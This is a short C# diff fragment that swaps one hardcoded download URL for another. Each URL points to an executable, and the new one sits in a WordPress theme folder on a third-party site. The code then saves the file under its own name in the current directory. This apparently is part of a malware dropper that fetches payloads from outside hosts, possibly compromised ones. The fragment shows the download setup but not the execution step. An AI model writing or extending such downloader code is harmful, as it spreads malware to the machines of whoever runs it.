@@ -49,7 +49,7 @@
               {
                   try
                   {
-                      string url = "http://pawopaw.xyz/roflanius1253/pimp.exe";
+                      string url = "https://www.vietnamdairy.vn/wp-content/themes/pridmag/azer.exe";
                                           string filename = Path.GetFileName(url);
                       string destinationpath = Path.Combine(Directory.GetCurrentDirectory(), filename);
 
